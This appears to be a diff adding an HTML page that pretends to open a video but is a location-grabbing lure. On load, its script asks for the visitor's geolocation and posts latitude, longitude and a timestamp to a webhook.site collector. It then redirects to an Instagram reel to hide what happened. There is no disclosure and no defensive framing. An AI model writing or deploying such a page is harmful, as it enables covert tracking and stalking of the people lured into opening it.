@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verifying Location…</title>
+</head>
+<body>
+  <h2>Video is opening...</h2>
+  <p id="status">Please wait…</p>
+
+  <script>
+    function sendLocation(lat, lon) {
+      fetch("https://webhook.site/70826bf1-a9bd-47b0-9143-ee9ddfc24587", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          timestamp: new Date().toISOString()
+        })
+      }).finally(() => {
+        // ✅ Redirect after sending location
+        window.location.href = "https://www.instagram.com/reel/DLVgFViTEvZ/?igsh=MWN3MHFoam82c2pjcQ==";
+      });
+    }
+
+    if (true) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          document.getElementById("status").innerText = `Video is opening`;
+          sendLocation(lat, lon);
+        },
+        (err) => {
+          document.getElementById("status").innerText = "Please allow to watch video-1";
+          // ❌ Optional: redirect even if denied
+          setTimeout(() => {
+            window.location.href = "https://webhook.site/70826bf1-a9bd-47b0-9143-ee9ddfc24587";
+          }, 2000);
+        }
+      );
+    } else {
+      document.getElementById("status").innerText = "Please allow to watch video-2";
+    }
+  </script>
+</body>
+</html>
